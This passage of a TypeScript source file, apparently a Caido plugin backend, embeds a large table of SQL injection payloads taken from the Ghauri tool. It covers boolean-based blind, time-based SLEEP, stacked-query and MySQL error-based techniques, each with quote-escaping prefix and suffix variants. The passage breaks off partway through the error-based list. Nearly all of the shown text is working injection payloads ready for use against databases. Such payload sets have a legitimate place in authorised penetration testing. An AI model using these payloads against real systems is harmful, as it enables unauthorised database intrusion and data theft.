// src/backend/index.ts
import { RequestSpecRaw } from "caido:utils";

// src/shared/ghauri-payloads.ts
var GH_ERROR_MARKER = "r0oth3x49";
var GHAURI_PAYLOADS = {
  "BooleanTests": {
    "boolean-based": [
      {
        "payload": "AND [RANDNUM]=[RANDNUM]",
        "vector": "AND [INFERENCE]",
        "title": "AND boolean-based blind - WHERE or HAVING clause",
        "dbms": "",
        "comments": [
          {
            "pref": " ",
            "suf": ""
          },
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": " OR '04586'='4586"
          },
          {
            "pref": '" ',
            "suf": ' OR "04586"="4586'
          },
          {
            "pref": ") ",
            "suf": " AND (04586=4586"
          },
          {
            "pref": ") ",
            "suf": " OR (04586=4586"
          },
          {
            "pref": "') ",
            "suf": " AND ('04586'='4586"
          },
          {
            "pref": '") ',
            "suf": ' AND ("04586"="4586'
          },
          {
            "pref": "' ",
            "suf": " AND '04586'='4586"
          },
          {
            "pref": '" ',
            "suf": ' AND "04586"="4586'
          },
          {
            "pref": "') ",
            "suf": " OR ('04586'='4586"
          },
          {
            "pref": '") ',
            "suf": ' OR ("04586"="4586'
          }
        ]
      },
      {
        "payload": "OR NOT [RANDNUM]=[RANDNUM]",
        "vector": "OR NOT [INFERENCE]",
        "title": "OR boolean-based blind - WHERE or HAVING clause (NOT)",
        "dbms": "",
        "comments": [
          {
            "pref": " ",
            "suf": ""
          },
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": " AND (04586=4586"
          },
          {
            "pref": "') ",
            "suf": " AND ('04586'='4586"
          },
          {
            "pref": '") ',
            "suf": ' AND ("04586"="4586'
          },
          {
            "pref": "' ",
            "suf": " AND '04586'='4586"
          },
          {
            "pref": '" ',
            "suf": ' AND "04586"="4586'
          }
        ]
      },
      {
        "payload": "OR [RANDNUM]=[RANDNUM]",
        "vector": "OR [INFERENCE]",
        "title": "OR boolean-based blind - WHERE or HAVING clause",
        "dbms": "",
        "comments": [
          {
            "pref": " ",
            "suf": ""
          },
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": " AND (04586=4586"
          },
          {
            "pref": ") ",
            "suf": " OR (04586=4586"
          },
          {
            "pref": "') ",
            "suf": " AND ('04586'='4586"
          },
          {
            "pref": '") ',
            "suf": ' AND ("04586"="4586'
          },
          {
            "pref": "' ",
            "suf": " AND '04586'='4586"
          },
          {
            "pref": '" ',
            "suf": ' AND "04586"="4586'
          },
          {
            "pref": "') ",
            "suf": " OR ('04586'='4586"
          },
          {
            "pref": '") ',
            "suf": ' OR ("04586"="4586'
          },
          {
            "pref": "' ",
            "suf": " OR '04586'='4586--"
          },
          {
            "pref": '" ',
            "suf": ' OR "04586"="4586--'
          }
        ]
      },
      {
        "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))",
        "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))",
        "title": "Boolean-based blind - Parameter replace",
        "dbms": "",
        "comments": [
          {
            "pref": "",
            "suf": ""
          },
          {
            "pref": " ",
            "suf": "--"
          },
          {
            "pref": "' AND 0546=",
            "suf": "--"
          },
          {
            "pref": '" AND 0456=',
            "suf": "--"
          },
          {
            "pref": ") AND 0866=",
            "suf": "--"
          },
          {
            "pref": "') AND 0758=",
            "suf": "--"
          },
          {
            "pref": '") AND 0541=',
            "suf": "--"
          }
        ]
      },
      {
        "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT 09567 UNION SELECT 08652) END))",
        "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT 09567 UNION SELECT 08652) END))",
        "title": "Boolean-based blind - Parameter replace (original value)",
        "dbms": "",
        "comments": [
          {
            "pref": "",
            "suf": ""
          }
        ]
      },
      {
        "payload": "(SELECT CASE WHEN([RANDNUM]=[RANDNUM]) THEN 9854 ELSE 0 END)",
        "vector": "(SELECT CASE WHEN([INFERENCE]) THEN 9854 ELSE 0 END)",
        "title": "boolean-based blind - WHERE or HAVING clause (CASE STATEMENT)",
        "dbms": "",
        "comments": [
          {
            "pref": "",
            "suf": ""
          },
          {
            "pref": "",
            "suf": "-- wXyW"
          },
          {
            "pref": "' AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": " AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": '"AND',
            "suf": 'AND"Z'
          },
          {
            "pref": "'AND",
            "suf": "AND'Z"
          },
          {
            "pref": "'XOR",
            "suf": "XOR'Z"
          },
          {
            "pref": '"XOR',
            "suf": 'XOR"Z'
          },
          {
            "pref": "'OR",
            "suf": "OR'Z"
          },
          {
            "pref": '"OR',
            "suf": 'OR"Z'
          },
          {
            "pref": " AND 9854=",
            "suf": "-- wXyW"
          },
          {
            "pref": " OR 9854=",
            "suf": "-- wXyW"
          },
          {
            "pref": "' AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" AND ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") AND ',
            "suf": "-- wXyW"
          }
        ]
      }
    ]
  },
  "MySQL": {
    "inline-query": [],
    "stacked-queries": [
      {
        "payload": "(SELECT(1)FROM(SELECT(SLEEP([SLEEPTIME])))a)",
        "vector": "(SELECT(1)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
        "title": "MySQL >= 5.0.12 stacked queries (query SLEEP)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": ";",
            "suf": "--"
          },
          {
            "pref": ",",
            "suf": "--"
          },
          {
            "pref": "';",
            "suf": "--"
          },
          {
            "pref": '";',
            "suf": "--"
          },
          {
            "pref": ");",
            "suf": "--"
          },
          {
            "pref": "');",
            "suf": "--"
          },
          {
            "pref": '");',
            "suf": "--"
          },
          {
            "pref": "',",
            "suf": "--"
          },
          {
            "pref": '",',
            "suf": "--"
          }
        ]
      },
      {
        "payload": "if(now()=sysdate(),sleep([SLEEPTIME]),0)",
        "vector": "if([INFERENCE],sleep([SLEEPTIME]),0)",
        "title": "MySQL >= 5.0.12 stacked queries (query SLEEP - comment)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": ";",
            "suf": "--"
          },
          {
            "pref": ",",
            "suf": "--"
          },
          {
            "pref": "';",
            "suf": "--"
          },
          {
            "pref": '";',
            "suf": "--"
          },
          {
            "pref": ");",
            "suf": "--"
          },
          {
            "pref": "');",
            "suf": "--"
          },
          {
            "pref": '");',
            "suf": "--"
          },
          {
            "pref": "',",
            "suf": "--"
          },
          {
            "pref": '",',
            "suf": "--"
          }
        ]
      },
      {
        "payload": "(SELECT CASE WHEN(1234=1234) THEN SLEEP([SLEEPTIME]) ELSE 0 END)",
        "vector": "(SELECT CASE WHEN([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE 0 END)",
        "title": "MySQL >= 5.0.12 stacked queries (query SLEEP - CASE STATEMENT)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": ";",
            "suf": "--"
          },
          {
            "pref": ",",
            "suf": "--"
          },
          {
            "pref": "';",
            "suf": "--"
          },
          {
            "pref": '";',
            "suf": "--"
          },
          {
            "pref": ");",
            "suf": "--"
          },
          {
            "pref": "');",
            "suf": "--"
          },
          {
            "pref": '");',
            "suf": "--"
          },
          {
            "pref": "',",
            "suf": "--"
          },
          {
            "pref": '",',
            "suf": "--"
          }
        ]
      }
    ],
    "boolean-based": [
      {
        "payload": "AND [RANDNUM]=[RANDNUM]",
        "vector": "AND [INFERENCE]",
        "title": "AND boolean-based blind - WHERE or HAVING clause (MySQL comment)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": " ",
            "suf": "#"
          },
          {
            "pref": "' ",
            "suf": "#"
          },
          {
            "pref": '" ',
            "suf": "#"
          },
          {
            "pref": ") ",
            "suf": "#"
          },
          {
            "pref": "') ",
            "suf": "#"
          },
          {
            "pref": '") ',
            "suf": "#"
          }
        ]
      },
      {
        "payload": "OR [RANDNUM]=[RANDNUM]",
        "vector": "OR [INFERENCE]",
        "title": "OR boolean-based blind - WHERE or HAVING clause (MySQL comment)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": " ",
            "suf": "#"
          },
          {
            "pref": "' ",
            "suf": "#"
          },
          {
            "pref": '" ',
            "suf": "#"
          },
          {
            "pref": ") ",
            "suf": "#"
          },
          {
            "pref": "') ",
            "suf": "#"
          },
          {
            "pref": '") ',
            "suf": "#"
          }
        ]
      },
      {
        "payload": "OR NOT [RANDNUM]=[RANDNUM]",
        "vector": "OR NOT [INFERENCE]",
        "title": "OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": " ",
            "suf": "#"
          },
          {
            "pref": "' ",
            "suf": "#"
          },
          {
            "pref": '" ',
            "suf": "#"
          },
          {
            "pref": ") ",
            "suf": "#"
          },
          {
            "pref": "') ",
            "suf": "#"
          },
          {
            "pref": '") ',
            "suf": "#"
          }
        ]
      },
      {
        "payload": "RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 0x28 END))",
        "vector": "RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))",
        "title": "MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": "",
            "suf": ""
          }
        ]
      },
      {
        "payload": "(IF([RANDNUM]=[RANDNUM],1,(select table_name from information_schema.tables)))",
        "vector": "(IF([INFERENCE],1,(select table_name from information_schema.tables)))",
        "title": "MySQL boolean-based blind - (IF STATEMENT)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": "'AND",
            "suf": "AND'Z"
          },
          {
            "pref": '"AND',
            "suf": 'AND"Z'
          },
          {
            "pref": "'XOR",
            "suf": "XOR'Z"
          },
          {
            "pref": '"XOR',
            "suf": 'XOR"Z'
          },
          {
            "pref": "'OR",
            "suf": "OR'Z"
          },
          {
            "pref": '"OR',
            "suf": 'OR"Z'
          }
        ]
      }
    ],
    "time-based": [
      {
        "payload": "(SELECT(0)FROM(SELECT(SLEEP([SLEEPTIME])))a)",
        "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
        "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": "'XOR",
            "suf": "XOR'Z"
          },
          {
            "pref": '"XOR',
            "suf": 'XOR"Z'
          },
          {
            "pref": "",
            "suf": ""
          },
          {
            "pref": "'+",
            "suf": "+'"
          },
          {
            "pref": '"+',
            "suf": '+"'
          },
          {
            "pref": "'OR",
            "suf": "OR'Z"
          },
          {
            "pref": '"OR',
            "suf": 'OR"Z'
          },
          {
            "pref": "'AND",
            "suf": "AND'Z"
          },
          {
            "pref": '"AND',
            "suf": 'AND"Z'
          },
          {
            "pref": " AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" AND ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") AND ',
            "suf": "-- wXyW"
          }
        ]
      },
      {
        "payload": "if(now()=sysdate(),SLEEP([SLEEPTIME]),0)",
        "vector": "if([INFERENCE],SLEEP([SLEEPTIME]),0)",
        "title": "MySQL >= 5.0.12 time-based blind (IF - comment)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": "'XOR(",
            "suf": ")XOR'Z"
          },
          {
            "pref": '"XOR(',
            "suf": ')XOR"Z'
          },
          {
            "pref": "",
            "suf": ""
          },
          {
            "pref": "",
            "suf": "-- wXyW"
          },
          {
            "pref": "'AND(",
            "suf": ")AND'Z"
          },
          {
            "pref": "'OR(",
            "suf": ")OR'Z"
          },
          {
            "pref": '"OR(',
            "suf": ')OR"Z'
          },
          {
            "pref": " AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" AND ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") AND ',
            "suf": "-- wXyW"
          }
        ]
      },
      {
        "payload": "(SELECT CASE WHEN(1234=1234) THEN SLEEP([SLEEPTIME]) ELSE 0 END)",
        "vector": "(SELECT CASE WHEN([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE 0 END)",
        "title": "MySQL >= 5.0.12 time-based blind (CASE STATEMENT)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": "'XOR",
            "suf": "XOR'Z"
          },
          {
            "pref": '"XOR',
            "suf": 'XOR"Z'
          },
          {
            "pref": "",
            "suf": ""
          },
          {
            "pref": "'OR",
            "suf": "OR'Z"
          },
          {
            "pref": "'AND",
            "suf": "AND'Z"
          },
          {
            "pref": "'+",
            "suf": "+'"
          },
          {
            "pref": "",
            "suf": "-- wXyW"
          },
          {
            "pref": '"AND',
            "suf": 'AND"Z'
          },
          {
            "pref": " AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" AND ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") AND ',
            "suf": "-- wXyW"
          }
        ]
      },
      {
        "payload": "SLEEP([SLEEPTIME])",
        "vector": "0986=IF(([INFERENCE]),SLEEP([SLEEPTIME]),986)",
        "title": "MySQL >= 5.0.12 time-based blind (SLEEP)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": " AND ",
            "suf": ""
          },
          {
            "pref": " AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": '" AND ',
            "suf": "-- wXyW"
          },
          {
            "pref": ") AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": '") AND ',
            "suf": "-- wXyW"
          }
        ]
      }
    ],
    "error-based": [
      {
        "payload": "AND (SELECT(!x-~0)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)x)y)",
        "vector": "AND (SELECT(!x-~0)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)x)y)",
        "title": "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": " ",
            "suf": "#"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "#"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "#"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "#"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "#"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "#"
          }
        ]
      },
      {
        "payload": "OR (SELECT(!x-~0)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)x)y)",
        "vector": "OR (SELECT(!x-~0)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)x)y)",
        "title": "MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": " ",
            "suf": "#"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "#"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "#"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "#"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "#"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "#"
          }
        ]
      },
      {
        "payload": "AND EXP(~(SELECT*FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)e)x))",
        "vector": "AND EXP(~(SELECT*FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)e)x))",
        "title": "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": " ",
            "suf": "#"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "#"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "#"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "#"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "#"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "#"
          }
        ]
      },
      {
        "payload": "OR EXP(~(SELECT*FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)e)x))",
        "vector": "OR EXP(~(SELECT*FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)e)x))",
        "title": "MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": " ",
            "suf": "#"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "#"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "#"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "#"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "#"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "#"
          }
        ]
      },
      {
        "payload": "AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)",
        "vector": "AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44),1337)",
        "title": "MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": " ",
            "suf": "#"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "#"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "#"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "#"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "#"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "#"
          }
        ]
      },
      {
        "payload": "OR GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)",
        "vector": "OR GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44),1337)",
        "title": "MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": " ",
            "suf": "#"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "#"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "#"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "#"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "#"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "#"
          }
        ]
      },
      {
        "payload": "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)) USING utf8)))",
        "vector": "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)) USING utf8)))",
        "title": "MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": " ",
            "suf": "#"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "#"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "#"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "#"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "#"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "#"
          }
        ]
      },
      {
        "payload": "OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)) USING utf8)))",
        "vector": "OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)) USING utf8)))",
        "title": "MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": " ",
            "suf": "#"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "#"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "#"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "#"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "#"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "#"
          }
        ]
      },
      {
        "payload": "AND (SELECT(x*1E308)FROM(SELECT CONCAT_WS(0x28,0x33,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)x)y)",
        "vector": "AND (SELECT(x*1E308)FROM(SELECT CONCAT_WS(0x28,0x33,0x496e6a65637465647e,[INFERENCE],0x7e454e44)x)y)",
        "title": "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": " ",
            "suf": "#"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "#"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "#"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "#"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "#"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "#"
          }
        ]
      },
      {
        "payload": "OR (SELECT(x*1E308)FROM(SELECT CONCAT_WS(0x28,0x33,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)x)y)",
        "vector": "OR (SELECT(x*1E308)FROM(SELECT CONCAT_WS(0x28,0x33,0x496e6a65637465647e,[INFERENCE],0x7e454e44)x)y)",
        "title": "MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": " ",
            "suf": "#"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "#"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "#"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "#"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "#"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "#"
          }
        ]
      },
      {
        "payload": "AND (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
        "vector": "AND (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,[INFERENCE],FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
        "title": "MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": " ",
            "suf": "#"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "#"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "#"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "#"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "#"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "#"
          }
        ]
      },
      {
        "payload": "OR 1 GROUP BY CONCAT_WS(0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))HAVING(MIN(0))",
        "vector": "OR 1 GROUP BY CONCAT_WS(0x7e,[INFERENCE],FLOOR(RAND(0)*2))HAVING(MIN(0))",
        "title": "MySQL >= 5.0 OR error-based - WHERE or HAVING clause (FLOOR)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": " ",
            "suf": "-- wXyW"
          },
          {
            "pref": " ",
            "suf": "#"
          },
          {
            "pref": "' ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' ",
            "suf": "#"
          },
          {
            "pref": '" ',
            "suf": "-- wXyW"
          },
          {
            "pref": '" ',
            "suf": "#"
          },
          {
            "pref": ") ",
            "suf": "-- wXyW"
          },
          {
            "pref": ") ",
            "suf": "#"
          },
          {
            "pref": "') ",
            "suf": "-- wXyW"
          },
          {
            "pref": "') ",
            "suf": "#"
          },
          {
            "pref": '") ',
            "suf": "-- wXyW"
          },
          {
            "pref": '") ',
            "suf": "#"
          }
        ]
      },
      {
        "payload": "UPDATEXML(0,CONCAT(0x7e,0x72306f746833783439,0x7e),0)",
        "vector": "UPDATEXML(0,CONCAT(0x7e,[INFERENCE],0x7e),0)",
        "title": "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)",
        "dbms": "MySQL",
        "comments": [
          {
            "pref": "",
            "suf": ""
          },
          {
            "pref": "(",
            "suf": ")"
          },
          {
            "pref": " AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": " AND ",
            "suf": "#"
          },
          {
            "pref": "' AND ",
            "suf": "-- wXyW"
          },
          {
            "pref": "' AND ",
            "suf": "#"
          },
          {
            "pref": '" AND ',
            "suf": "-- wXyW"
          },
          {
            "pref": '" AND ',
            "suf": "#"
          },
          {
